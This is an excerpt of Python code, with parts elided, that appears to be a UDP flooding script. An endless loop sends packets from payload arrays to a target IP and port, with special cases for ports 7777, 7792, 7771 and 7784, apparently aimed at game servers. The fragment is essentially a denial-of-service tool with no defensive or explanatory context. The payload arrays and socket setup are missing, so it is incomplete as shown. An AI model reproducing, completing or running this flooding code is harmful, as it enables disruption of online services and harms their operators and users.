...
ms = Dat[random.randrange(0, 3)]
m = Da[random.randrange(0, 3)]
...
while 1:
    try:
        for x in range(times):
            ...
            sock.sendto(ms, (ip, int(port)))
            sock.sendto(Dat[5], (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Dat[5], (ip, int(port)))
            elif int(port) == 7792:
                sock.sendto(Dat[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Dat[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Dat[7], (ip, int(port)))
            
            sock.sendto(m, (ip, int(port)))
            sock.sendto(Da[5], (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Da[5], (ip, int(port)))
            elif int(port) == 7792:
                sock.sendto(Da[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Da[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Da[7], (ip, int(port)))
